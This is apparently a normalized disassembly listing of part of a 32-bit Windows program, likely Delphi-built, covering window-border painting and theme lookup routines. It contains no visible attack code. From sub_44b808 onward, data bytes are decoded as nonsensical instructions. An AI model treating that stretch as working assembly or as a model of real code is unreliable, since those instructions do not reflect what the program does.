mov edx [ ebp + 0x10 ]
mov [ edx + ebx * 4 ] eax
lea edx [ edi + 0x2 ]
mov eax [ ebp + 0x10 ]
mov eax [ eax + ebx * 4 ]
xor ecx ecx
call sub_402bf8
mov eax [ ebp + 0x10 ]
mov eax [ eax + ebx * 4 ]
mov ecx edi
mov edx [ ebp - 0x4 ]
call sub_406c44
inc ebx
inc [ esi + 0x10 ]
mov ebx 0x1
xor ebx ebx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ab29
lea eax [ ebp - 0xc ]
call sub_403f7c
lea eax [ ebp - 0x4 ]
call sub_40465c
retn
sub_44ab48
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax ebx
call sub_44aa2c
mov edx [ ebp + 0xc ]
add [ ebx + 0x10 ] edx
cmp eax [ ebx + 0x10 ]
jle r-xdata
xor eax eax
mov [ ebx + 0x10 ] eax
mov eax 0x1
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0x8
sub_44ab74
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_44abe3
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44abea
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
mov eax rw-data
mov edx [ r-xdata ]
call sub_4049b8
mov eax rw-data
mov edx [ r-xdata ]
call sub_4049b8
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_44ae3c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
call sub_42f898
mov [ esi + 0x5 ] al
call sub_440e28
cmp eax 0x60000
setge al
mov [ esi + 0x4 ] al
mov eax esi
call sub_44b7a0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax esi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_44ae88
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
mov eax esi
call sub_44af28
call sub_42f6d8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4031dc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_44aebc
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp [ esi + 0x6 ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ esi + eax * 4 + 0x8 ]
pop edi
pop esi
pop ebx
retn
xor eax eax
mov al bl
cmp [ esi + eax * 4 + 0x8 ] 0x0
jne r-xdata
mov edi ebx
and edi 0x7f
mov eax [ edi * 4 + rw-data ]
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ esi + edi * 4 + 0x8 ] eax
sub_44af28
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
inc ebx
cmp bl 0x18
jne r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
xor eax eax
mov [ esi + edi * 4 + 0x8 ] eax
mov edi ebx
and edi 0x7f
mov eax [ esi + edi * 4 + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_44af6c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_44aebc
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_44afbc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_44aebc
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_44b008
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_44aebc
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_44b04c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_44aebc
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_44b094
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp + 0x10 ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov al 0x1
test eax eax
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov dl [ ebx ]
mov eax esi
call sub_44aebc
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
test al al
je r-xdata
sub_44b0fc
mov [ ecx ] 0x0
xor eax eax
mov al dl
cmp eax 0xf
jge r-xdata
add eax 0xfffffff1
sub eax 0xc
jb r-xdata
add eax 0xfffffffe
sub eax 0x5
jb r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0xf
jmp r-xdata
sub eax 0x2
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
sub eax 0x8
jb r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x4
mov eax 0x1b
jmp r-xdata
je r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x7
jmp r-xdata
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0x1d
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_44b180
mov [ ecx ] 0x3
mov eax edx
add al 0xfe
sub al 0x7
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
je r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x2
mov eax 0x9
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_44b1bc
mov [ ecx ] 0xe
mov eax edx
sub al 0x2
je r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
dec al
je r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x2
mov eax 0x3
jmp r-xdata
dec al
je r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0x4
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_44b20c
mov [ ecx ] 0x12
xor eax eax
mov al dl
cmp eax 0x14
jge r-xdata
add eax 0xffffffec
sub eax 0x6
jb r-xdata
add eax 0xfffffffe
sub eax 0x6
jb r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0x14
jmp r-xdata
sub eax 0x6
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
sub eax 0x6
jb r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x5
mov eax 0x1a
jmp r-xdata
sub eax 0x6
jb r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x8
jmp r-xdata
sub eax 0x6
jb r-xdata
mov [ ecx + 0x4 ] 0x6
mov eax 0x20
jmp r-xdata
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0xe
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_44b2a8
mov [ ecx ] 0x17
xor eax eax
mov al dl
cmp eax 0x68
ja r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
mov al [ eax + lookup_table_44b2c5 ]
jmp [ eax * 4 + jump_table_44b32e ]
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x5
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0x8
jmp r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0xb
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0xe
jmp r-xdata
mov [ ecx + 0x4 ] 0x6
mov eax 0x11
jmp r-xdata
mov [ ecx + 0x4 ] 0x7
mov eax 0x14
jmp r-xdata
mov [ ecx + 0x4 ] 0x8
mov eax 0x16
jmp r-xdata
mov [ ecx + 0x4 ] 0x9
mov eax 0x18
jmp r-xdata
mov [ ecx + 0x4 ] 0xa
mov eax 0x1a
jmp r-xdata
mov [ ecx + 0x4 ] 0xb
mov eax 0x1c
jmp r-xdata
mov [ ecx + 0x4 ] 0xc
mov eax 0x1e
jmp r-xdata
mov [ ecx + 0x4 ] 0xd
mov eax 0x20
jmp r-xdata
mov [ ecx + 0x4 ] 0xe
mov eax 0x24
jmp r-xdata
mov [ ecx + 0x4 ] 0xf
mov eax 0x28
jmp r-xdata
mov [ ecx + 0x4 ] 0x10
mov eax 0x2c
jmp r-xdata
mov [ ecx + 0x4 ] 0x11
mov eax 0x30
jmp r-xdata
mov [ ecx + 0x4 ] 0x12
mov eax 0x34
jmp r-xdata
mov [ ecx + 0x4 ] 0x13
mov eax 0x38
jmp r-xdata
mov [ ecx + 0x4 ] 0x14
mov eax 0x3c
jmp r-xdata
mov [ ecx + 0x4 ] 0x15
mov eax 0x40
jmp r-xdata
mov [ ecx + 0x4 ] 0x16
mov eax 0x44
jmp r-xdata
mov [ ecx + 0x4 ] 0x17
mov eax 0x48
jmp r-xdata
mov [ ecx + 0x4 ] 0x18
mov eax 0x4c
jmp r-xdata
mov [ ecx + 0x4 ] 0x19
mov eax 0x50
jmp r-xdata
mov [ ecx + 0x4 ] 0x1a
mov eax 0x54
jmp r-xdata
mov [ ecx + 0x4 ] 0x1b
mov eax 0x58
jmp r-xdata
mov [ ecx + 0x4 ] 0x1c
mov eax 0x5c
jmp r-xdata
mov [ ecx + 0x4 ] 0x1d
mov eax 0x60
jmp r-xdata
mov [ ecx + 0x4 ] 0x1e
mov eax 0x61
jmp r-xdata
mov [ ecx + 0x4 ] 0x1f
mov eax 0x62
jmp r-xdata
mov [ ecx + 0x4 ] 0x20
mov eax 0x63
jmp r-xdata
mov [ ecx + 0x4 ] 0x21
mov eax 0x64
jmp r-xdata
mov [ ecx + 0x4 ] 0x22
mov eax 0x65
jmp r-xdata
mov [ ecx + 0x4 ] 0x23
mov eax 0x66
jmp r-xdata
mov [ ecx + 0x4 ] 0x24
mov eax 0x67
jmp r-xdata
mov [ ecx + 0x4 ] 0x25
mov eax 0x68
jmp r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
sub_44b634
push ebp
mov ebp esp
add esp 0xffffffbc
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
push 0xffffffec
mov eax [ ebp - 0x4 ]
call sub_45c380
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_45c380
push eax
call GetWindowRect
mov eax [ ebp - 0x24 ]
neg eax
push eax
mov eax [ ebp - 0x28 ]
neg eax
push eax
lea eax [ ebp - 0x28 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
call sub_45c380
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_44b78f
push [ fs : edx ]
mov [ fs : edx ] esp
push esi
lea esi [ ebp - 0x28 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
test bl bl
je r-xdata
mov eax [ ebp - 0x1c ]
sub eax 0x2
push eax
mov eax [ ebp - 0x20 ]
sub eax 0x2
push eax
mov eax [ ebp - 0x24 ]
add eax 0x2
push eax
mov eax [ ebp - 0x28 ]
add eax 0x2
push eax
mov eax [ ebp - 0x8 ]
push eax
call ExcludeClipRect
lea ecx [ ebp - 0x34 ]
mov dl 0x2
mov eax esi
call sub_44b180
lea eax [ ebp - 0x28 ]
push eax
push 0x0
lea ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_44b008
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_45c380
push eax
call ReleaseDC
retn
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_45c380
push eax
call GetWindowLongA
test eax 0x100000
je r-xdata
test eax 0x200000
je r-xdata
push 0x2
call GetSystemMetrics
mov edi eax
push 0x3
call GetSystemMetrics
mov ebx eax
push 0xfffffffe
push 0xfffffffe
lea eax [ ebp - 0x18 ]
push eax
call InflateRect
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x44 ]
push eax
mov edx [ ebp - 0xc ]
sub edx ebx
mov eax [ ebp - 0x10 ]
sub eax edi
mov ecx [ ebp - 0x10 ]
call sub_41776c
push esi
lea esi [ ebp - 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push 0xf
call GetSysColorBrush
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call FillRect
sub_44b7bc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_44b7f7
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b7fe
retn
mov eax [ rw-data ]
call sub_4031ec
mov eax rw-data
call sub_403f7c
sub_44b808
or al 0xb8
inc esp
add [ ebx ] al
or edx [ esp + edx * 2 + 0x65 ]
js r-xdata
add [ ecx + esi + 0x31a00040 ] al
inc eax
add al ah
aad 0x45
dec esp
popad
jns r-xdata
adc esi [ eax - 0x384fec ]
add [ edi * 2 - 0x283fffbb ] al
inc esp
add [ esi + ecx * 2 + 0x45 ] dl
add [ eax + 0x20004559 ] ch
pop ecx
inc ebp
add [ esp + ebx * 2 ] dh
inc ebp
add al ah
pop edx
inc ebp
add ah cl
insb
inc ebp
add [ eax + 0x2000457d ] cl
pop edi
inc ebp
add [ edi + ebx * 2 + 0x50080045 ] dl
inc ebp
add [ edi + ebx * 2 + 0x45 ] dh
add [ ebp + edx * 8 - 0x2bc7ffbc ] bh
inc esp
add [ edi ] al
add [ edx ] dl
mov al 0xe
mov al 0x6
mov al 0x13
mov al 0x14
mov al 0xc7
inc esi
call eax
fadd [ eax + eax - 0x14 ]
fadd [ eax + eax + 0x4 ]
fld [ eax + eax - 0x60 ]
fld [ eax + eax - 0x3c ]
fld [ eax + eax - 0x2c ]
salc
inc esp
add [ esp + edx * 8 + 0x44 ] cl
add [ esp + edx * 2 ] cl
inc ebx
jne r-xdata
inc ebp
jne r-xdata
test [ ecx ] dh
inc eax
add [ eax - 0x1fffbfcf ] ah
je r-xdata
xor [ eax ] eax
loopne r-xdata
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] cl
mov eax 0x74050044
insb
push esp
outsd
jo r-xdata
js r-xdata
add [ edi * 2 - 0x283fffbb ] al
aad 0x45
add [ eax + 0x7b ] al
inc ebp
add [ eax ] bh
outsd
inc ebp
inc ebp
add [ ecx + esi + 0x31a00040 ] al
inc eax
add al ah
insd
dec esp
popad
bound esp [ ebp + 0x6c ]
lea eax [ eax ]
push 0x70044b9
or al 0x54
inc ebx
jne r-xdata
add [ ecx + edi * 4 + 0x44 ] dl
add [ eax + 0x7b ] al
inc ebp
add [ eax ] bh
inc ebp
or [ esp + ebp * 2 + 0x42 ] dh
je r-xdata
inc esp
add [ esi + ecx * 2 + 0x45 ] dl
add [ eax + 0x20004559 ] ch
pop ecx
inc ebp
add [ esp + ebx * 2 ] dh
inc ebp
add al ah
pop edx
inc ebp
add ah cl
insb
inc ebp
add [ eax + 0x2000457d ] cl
pop edi
inc ebp
add [ edi + ebx * 2 + 0x50080045 ] dl
inc ebp
add [ edi + ebx * 2 + 0x45 ] dh
add [ ebp + edx * 8 - 0x2bc7ffbc ] bh
inc esp
add [ esi ] al
push esp
dec esp
popad
bound esp [ ebp + 0x6c ]
nop
add al 0x7d
inc ebp
add al al
xlat
inc esp
add [ edi ] al
push es
push esp
dec esp
popad
bound esp [ ebp + 0x6c ]
fdivr [ ecx - 0x469bffbc ]
inc esp
add [ edx ] dh
add [ eax ] cl
push ebx
je r-xdata
xchg ebx eax
inc ecx
add [ eax - 0x5fffbb2a ] bh
fadd [ eax + eax - 0x78 ]
je r-xdata
je r-xdata
outsd
insd
add al bl
xchg ebx eax
inc ecx
add [ eax - 0x5fffbb2a ] bh
fadd [ eax + eax - 0x78 ]
inc ebx
outsb
je r-xdata
add [ edi ] al
inc ecx
outsb
inc ebx
je r-xdata
add al bl
insd
dec esp
popad
bound esp [ ebp + 0x6c ]
xchg esp eax
mov eax 0x1ca80044
inc ebp
add [ ebx ] cl
add [ eax ] cl
push ebx
je r-xdata
pushfd
push 0x45
add [ eax - 0x2bffbab3 ] dl
push esp
inc ebp
add [ eax ] bh
push esp
inc ebp
add [ eax + 0x5d ] ah
inc ebp
add al bl
dec esp
inc ebp
add ah bl
dec esp
inc ebp
add al bl
jl r-xdata
add [ edi + edx + 0x42 ] bl
inc edx
add [ edi + edx + 0x42 ] dl
add [ edx + ebx + 0x42 ] bh
add [ eax - 0x2fffbb2d ] ah
imul eax [ ebp ] sub_4569cc
insb
jae r-xdata
outsd
inc ebp
jb r-xdata
add [ eax ] cl
pop esp
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050011 ] al
outsd
insb
outsd
jb r-xdata
add [ eax ] dl
inc eax
add [ ebp + 0x1 ] ch
add bh bh
pop esp
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push cs
add [ eax ] cl
inc ecx
jne r-xdata
insb
jae r-xdata
dec esi
inc ebp
add [ eax + ebx * 2 ] dh
inc ebp
add [ edx + ebx + 0x42 ] dh
add [ edi + edx + 0x42 ] bl
mov al [ 0xffffffff880044d8 ]
inc ebx
je r-xdata
dec eax
add al ch
or eax 0xb8fffb7a
nop
or al 0x48
add al ch
xchg ebx eax
xchg ebx edi
push [ ebx ]
rcr [ edx + 0x59 ] 0x59
mov [ fs : eax ] edx
push sub_44b7fe
retn
add [ ecx + eax + 0x1bb40000 ] cl
inc ebp
add [ edx + ebx + 0x42 ] bl
add [ eax + 0x34 ] al
inc eax
add [ eax + 0x48004213 ] dh
xor al 0x40
add [ eax + 0x6e ] ah
xchg esp eax
mov eax 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x44b9
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
mov ecx 0xb9540044
inc esp
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
je r-xdata
or [ edx + 0x69 ] al
inc esp
imul ecx [ ebp + 0x6f ] 0x7a86564
or [ ebp ] al
inc ebp
outsd
push ebx
imul edi [ edx + 0x65 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
jo r-xdata
arpl [ eax + 0x6f ] bp
jb r-xdata
add bh bh
movsb [ edi ] [ esi ]
xlat
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al 0x0
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
or al 0x8
inc ebp
add [ ecx ] ah
add bh bh
mov al [ 0x3c00454d ]
dec esi
inc ebp
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or eax 0x6e410700
add al bl
add [ ebp ] al
pop ebx
add [ eax ] al
jmp [ eax + 0x4f ]
add [ edi + edx + 0x42 ] dl
add [ edx + ebx + 0x42 ] bh
add [ eax - 0x2fffbb2d ] ah
imul eax [ ebp ] sub_4569cc
pushfd
push 0x45
add [ eax - 0x2bffbab3 ] dl
push esp
inc ebp
add [ eax ] bh
push esp
inc ebp
add [ eax + 0x5d ] ah
inc ebp
add al bl
dec esp
inc ebp
add ah bl
dec esp
inc ebp
add al bl
jl r-xdata
pop ss
inc edx
insb
jae r-xdata
dec esi
inc ebp
add [ eax + ebx * 2 ] dh
inc ebp
add [ edx + ebx + 0x42 ] dh
mov al [ 0xffffffff880044d8 ]
outsd
je r-xdata
inc edx
add bh bh
fwait
imul ebp [ edi + 0x6e ] sub_422998
jo r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0012 ] al
outsd
outsb
jae r-xdata
add bh bh
and [ edi + 0x45 ] bh
add [ eax ] dl
add dh bh
add [ fs : eax ] al
jb r-xdata
je r-xdata
inc ebp
add [ edx + ebx * 2 + 0x45 ] cl
add [ edx + ebx * 2 + 0x45 ] bh
add [ eax + 0x7a ] cl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070010 ] al
popad
jo r-xdata
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4208000f ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0xa865646f
pop es
add [ eax + r-xdata ] dl
add bh bh
in al dx
pop ebx
inc ebp
add [ eax ] al
add [ 0x72440800 ] dl
popad
dec ebp
outsd
add [ gs : eax ] dl
inc eax
imul ebp [ esi + 0x74 ] 0x4500c073
add [ edx ] bh
add bh bh
jpe r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc eax [ eax ]
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
jae r-xdata
add bh bh
call 0x145011a
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x460c0017 ] al
outsd
arpl [ ebp + 0x73 ] si
inc ebx
outsd
outsb
je r-xdata
jb r-xdata
inc eax
add [ ecx ] bl
add bh bh
js r-xdata
outsd
insb
cmp [ esi ] ch
inc edx
add [ eax ] ch
add bh bh
inc eax
pop ebx
inc ebp
add [ eax + 0x5b ] dl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040018 ] al
outsd
outsb
je r-xdata
add [ esi ] dl
add [ edi ] al
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
mov [ ebx ] ds
inc ebp
add [ eax + 0x1 ] ch
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
pop es
inc ebp
add [ ebx - 0x64010000 ] bl
sbb [ 0x6f500900 ] 0x70
jne r-xdata
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb eax [ eax ]
or dl [ eax + 0x61 ]
jb r-xdata
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
popad
jb r-xdata
dec ebp
add [ eax + 0x1 ] al
outsb
je r-xdata
jb r-xdata
outsb
adc [ eax ] al
jo r-xdata
adc [ eax ] al
fcom st7
inc esp
add [ eax ] bl
fadd [ eax + eax - 0x78 ]
add [ eax ] eax
inc [ eax ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x540b0020 ] al
jb r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
add [ eax ] al
and [ esi ] 0x0
or cl [ edi + 0x6e ]
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
jo r-xdata
fadd [ eax + eax + 0x1 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and [ eax ] eax
push es
dec esp
popad
jns r-xdata
mov eax 0x16e0044
add bh bh
pop esp
push ds
add [ 0x776f6853 ] cl
inc ecx
arpl [ ebx + 0x65 ] sp
insb
inc ebx
push 0x10007261
add bh bh
cld
xlat
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ eax ] al
and eax [ eax ]
or [ edi + 0x6f ] dl
jb r-xdata
outsb
jae r-xdata
je r-xdata
jo r-xdata
adc [ eax ] al
0xc0ff0000 0x455b
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al 0x0
push cs
push eax
popad
jb r-xdata
add [ eax ] 0x0
add [ eax + 0x4f09002a ] al
outsb
inc ebp
outsb
inc esp
jb r-xdata
inc esp
jb r-xdata
add [ eax ] al
pop edi
inc ecx
add [ eax ] ah
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax 0x6e4f0e00
jne r-xdata
push edi
add [ eax ] eax
jmp [ eax ]
je r-xdata
outsb
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308001f ] al
push 0x6948776f
outsb
outsb
je r-xdata
add [ eax ] al
add [ eax + 0x4f09002d ] al
outsb
dec ebp
jo r-xdata
or [ ebp ] eax
rol [ eax ] 0x1
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax [ eax ]
or ecx [ edi + 0x6e ]
jo r-xdata
add [ eax ] al
js r-xdata
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0025 ] al
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
insb
pop ecx
inc ebp
add al cl
jpe r-xdata
inc eax
add [ ecx - 0x63010000 ] bl
pop ebx
inc ebp
add [ ebx + ebx * 2 + 0x45 ] ah
add [ eax ] dl
push 0x6948776f
outsb
je r-xdata
inc esp
outsd
arpl [ ebx - 0x44 ] bp
or eax [ ebp ]
adc [ ecx ] al
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
push ebp
jo r-xdata
dec ebp
outsd
jne r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc ebp
add al dl
add [ eax ] al
call eax
add [ eax ] al
je r-xdata
inc esp
outsd
ja r-xdata
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe943be8d
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0027 ] al
outsb
inc esp
jb r-xdata
insb
inc ebx
insb
add [ eax + 0x4f0a0028 ] al
outsb
inc esp
jb r-xdata
or al [ ebp ]
[ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
